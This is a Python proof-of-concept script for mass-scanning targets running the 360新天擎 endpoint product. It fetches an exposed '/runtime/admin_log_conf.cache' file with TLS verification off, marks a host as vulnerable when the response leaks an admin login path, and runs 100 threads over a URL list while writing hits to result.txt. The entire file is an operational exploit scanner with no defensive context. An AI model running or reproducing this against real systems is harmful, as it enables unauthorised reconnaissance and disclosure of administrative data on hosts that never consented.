import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 

"""
    print(banner)
def poc(target):
    url = target+'/runtime/admin_log_conf.cache'
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
    }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5).text
        if '/api/node/login' in res:
            print(f"[+] {target} 漏洞存在")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} 不存在漏洞")
    except:
        print(f"[*] {target} 请手动测试")
def main():
    banner()
    parser = argparse.ArgumentParser(description='360新天擎')
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
        
if __name__ == '__main__':
    main()